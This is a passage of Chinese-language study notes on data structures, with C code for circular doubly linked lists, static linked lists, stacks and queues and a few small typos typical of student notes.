class="keyword">if</span>(L-&gt;next==L)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(DLinklist L,DNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next==L)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环双链表的插入"><a href="#循环双链表的插入" class="headerlink" title="循环双链表的插入"></a>循环双链表的插入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextDNode</span><span class="params">(DNode *p,DNode *s)</span>&#123;</span><br><span class="line">s-&gt;next=p-&gt;next;</span><br><span class="line">p-&gt;next-&gt;piror=s; <span class="comment">//step2</span></span><br><span class="line">s-&gt;piror=p;</span><br><span class="line">p-&gt;next=s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step2 compare to <a href="#双链表的插入">#双链表的插入</a></strong><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/5470140210772.png" alt=""></p><h3 id="循环双链表的删除"><a href="#循环双链表的删除" class="headerlink" title="循环双链表的删除"></a>循环双链表的删除</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">DNode *q=p-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(q==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line">q-&gt;next-&gt;prior=p;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step2 compare to <a href="#双链表的删除">#双链表的删除</a></strong><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/1754344229198.png" alt=""></p><h2 id="2-11-静态链表"><a href="#2-11-静态链表" class="headerlink" title="2.11 静态链表"></a>2.11 静态链表</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/3614549217065.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="type">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">a</span>[<span class="title">MaxSize</span>];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>课本上的定义:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="type">int</span> next;</span><br><span class="line">&#125;SLinkList[MaxSize];</span><br></pre></td></tr></table></figure><br>等价于<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="type">int</span> next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">SLinkList</span>[<span class="title">MaxSize</span>];</span></span><br></pre></td></tr></table></figure><br>注解:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">SLinkList a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>等价于<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">a</span>[<span class="title">MaxSize</span>];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>自己验证一下吧！<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="type">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="type">int</span> next;</span><br><span class="line">&#125;SLinkList[MaxSize];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">x</span>;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sizeX=%d\n&quot;</span>,<span class="keyword">sizeof</span>(x));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">a</span>[<span class="title">MaxSize</span>];</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sizeA=%d\n&quot;</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line"></span><br><span class="line">SLinkList b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sizeof=%d\n&quot;</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/2066940247231.png" alt=""></p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>从头结点出发挨个往后遍历结点 O(n)</p><h3 id="插入位序为i的结点"><a href="#插入位序为i的结点" class="headerlink" title="插入位序为i的结点"></a>插入位序为i的结点</h3><p>1.找到一个空的结点，存入数据元素<br>2.从头结点出发找到位序为i-1的结点<br>3.修改新节点的next<br>4.修改i-1号结点的next</p><h3 id="删除某个结点"><a href="#删除某个结点" class="headerlink" title="删除某个结点"></a>删除某个结点</h3><p>1.从头结点出发找到前驱结点<br>2.修改前驱结点的游标<br>3.被删除结点next设为-2(空)</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>静态链表:用数组的方式实现的链表<br>优点:增,删操作不需要大量移动元素<br>缺点:不能随机存取，只能从头结点开始依次往后查<br>找:<strong>容量固定不可变</strong><br>适用场景:<br>1.不支持指针的低级语言<br>2.数据元素数量固定不变的场景(如操作系统的文件分配表FAT)</p><h2 id="2-12-顺序表和链表的比较"><a href="#2-12-顺序表和链表的比较" class="headerlink" title="2.12 顺序表和链表的比较"></a>2.12 顺序表和链表的比较</h2><h1 id="3-栈和队列"><a href="#3-栈和队列" class="headerlink" title="3.栈和队列"></a>3.栈和队列</h1><h2 id="3-1-栈的基本概念"><a href="#3-1-栈的基本概念" class="headerlink" title="3.1 栈的基本概念"></a>3.1 栈的基本概念</h2><p>栈是<strong>只允许在一端进行插入和删除操作</strong>的线性表<br>特点:后进先出 Last First Out （LIFO)<br>n个不同元素进栈，出栈元素不同排列的个数为<script type="math/tex">\frac{1}{n+1} C_{n}^{2n}</script>，上述公式称为卡特兰(Catalan )数(不要求掌握)</p><h2 id="3-2-栈的顺序存储结构"><a href="#3-2-栈的顺序存储结构" class="headerlink" title="3.2 栈的顺序存储结构"></a>3.2 栈的顺序存储结构</h2><h3 id="初始化操作"><a href="#初始化操作" class="headerlink" title="初始化操作"></a>初始化操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType data[MaxSize];</span><br><span class="line"><span class="type">int</span> top;  <span class="comment">//栈顶指针 </span></span><br><span class="line">&#125;SqStack;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span>&#123;</span><br><span class="line">S.top=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testStack</span><span class="params">()</span>&#123;</span><br><span class="line">SqStack S;</span><br><span class="line">InitStack(S);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(S.top==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="进栈操作"><a href="#进栈操作" class="headerlink" title="进栈操作"></a>进栈操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(SqStack &amp;S,ElemType x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(S.top==MaxSize<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">S.top=S.top+<span class="number">1</span>;</span><br><span class="line">S.data[S.top]=x;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S.top=S.top+<span class="number">1</span>;</span><br><span class="line">S.data[S.top]=x;</span><br><span class="line">等价于</span><br><span class="line">S.data[++S.top]=x;</span><br></pre></td></tr></table></figure><h3 id="出栈操作"><a href="#出栈操作" class="headerlink" title="出栈操作"></a>出栈操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(SqStack &amp;S,ElemType &amp;x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(S.top==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">x=S.data[S.top];</span><br><span class="line">S.top=S.top<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x=S.data[S.top];</span><br><span class="line">S.top=S.top<span class="number">-1</span>;</span><br><span class="line">等价于</span><br><span class="line">x=S.data[S.top--];</span><br></pre></td></tr></table></figure><h3 id="读栈顶元素操作"><a href="#读栈顶元素操作" class="headerlink" title="读栈顶元素操作"></a>读栈顶元素操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">GetTop</span><span class="params">(SqStack &amp;S,ElemType &amp;x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(S.top==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">x=S.data[S.top];</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span>&#123;</span><br><span class="line">S.top=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S.data[S.top++]=x;</span><br><span class="line">x=S.data[--S.top];</span><br><span class="line">top==MaxSize</span><br></pre></td></tr></table></figure></p><h3 id="共享栈"><a href="#共享栈" class="headerlink" title="共享栈"></a>共享栈</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType data[MaxSize];</span><br><span class="line"><span class="type">int</span> top0;</span><br><span class="line"><span class="type">int</span> top1;</span><br><span class="line">&#125;ShStack;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(ShStack &amp;S)</span>&#123;</span><br><span class="line">S.top0=<span class="number">-1</span>;</span><br><span class="line">S.top1=MaxSize;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">Stackfull</span><span class="params">(ShStack &amp;S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top0+<span class="number">1</span>==top1)&#123;</span><br><span class="line">        <span class="keyword">return</span> ture;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-栈的链式存储结构"><a href="#3-3-栈的链式存储结构" class="headerlink" title="3.3 栈的链式存储结构"></a>3.3 栈的链式存储结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;*LiStack;</span><br></pre></td></tr></table></figure><p><strong>根据复习单链表不带头结点的操作</strong></p><h2 id="3-4-列队的基本概念"><a href="#3-4-列队的基本概念" class="headerlink" title="3.4 列队的基本概念"></a>3.4 列队的基本概念</h2><p>队列是<strong>只允许在一端进行插入，在另一端删除</strong>的线性表<br>队列的特点:先进先出First In First Out(FIFO)</p><h2 id="3-5-列队的顺序存储结构"><a href="#3-5-列队的顺序存储结构" class="headerlink" title="3.5 列队的顺序存储结构"></a>3.5 列队的顺序存储结构</h2><h3 id="队列的顺序实现"><a href="#队列的顺序实现" class="headerlink" title="队列的顺序实现"></a>队列的顺序实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType data[MaxSize];</span><br><span class="line"><span class="type">int</span> front,rear;</span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue &amp;Q)</span>&#123;</span><br><span class="line">Q.rear=Q.front=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testQueue</span><span class="params">()</span>&#123;</span><br><span class="line">SqQueue Q;</span><br><span class="line">InitQueue(Q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">QueueEmpty</span><span class="params">(SqQueue Q)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.rear==Q.front)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MaxSize==Q.front)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">Q.data[Q.rear]=x;</span><br><span class="line">Q.rear=(Q.rear+<span class="number">1</span>)%MaxSize; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.rear==Q.front)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">x=Q.data[Q.front];</span><br><span class="line">Q.front=(Q.front+<span class="number">1</span>)%MaxSize;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">GetHead</span><span class="params">(SqQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.rear==Q.front)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">x=Q.data[Q.front];</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="判断队列状态"><a href="#判断队列状态" class="headerlink" title="判断队列状态"></a>判断队列状态</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>队列已满:<br><code>(Q.rear+1)%MaxSize==Q.front</code><br>队空:<br><code>Q.rear==Q.front</code><br><strong>队列元素的个数:</strong><br><strong><code>(rear+MaxSize-front)%MaxSize</code></strong></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType data[MaxSize];</span><br><span class="line"><span class="type">int</span> front,rear;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p>插入<code>size++;</code><br>删除<code>size--;</code><br>队满<code>size==MaxSize;</code><br>队空<code>size==0;</code></p><h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType data[MaxSize];</span><br><span class="line"><span class="type">int</span> front,rear;</span><br><span class="line"><span class="type">int</span> tag; <span class="comment">//最近进行的是删除0/插入1</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p>队满:<code>front==rear&amp;&amp;tag==1</code><br>队空:<code>front==rear&amp;&amp;tag==0</code></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>rear指向队尾元素<br>入队:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Q.rear=(Q.rear+<span class="number">1</span>)%MaxSize;</span><br><span class="line">Q.data[Q.rear]=x;</span><br></pre></td></tr></table></figure><br>初始化:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">front=<span class="number">0</span>；</span><br><span class="line">rear=n<span class="number">-1</span>；</span><br></pre></td></tr></table></figure><br>队空：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Q.rear+<span class="number">1</span>]%MaxSize==Q.front;</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/2061837210863.png" alt=""><br>队满：<br>法1:牺牲一个存储单元<br>法2:增加一个辅助变量<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/3510537229289.png" alt=""></p><h2 id="3-6-列队的链式存储结构"><a href="#3-6-列队的链式存储结构" class="headerlink" title="3.6 列队的链式存储结构"></a>3.6 列队的链式存储结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">LinkNode *front,*rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure><h3 id="初始化-带头结点"><a href="#初始化-带头结点" class="headerlink" title="初始化(带头结点)"></a>初始化(带头结点)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">Q.front=Q.rear=(LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testLinkQueue</span><span class="params">()</span>&#123;</span><br><span class="line">LinkQueue Q;</span><br><span class="line">InitQueue(Q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="初始化-不带头结点"><a href="#初始化-不带头结点" class="headerlink" title="初始化(不带头结点)"></a>初始化(不带头结点)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span 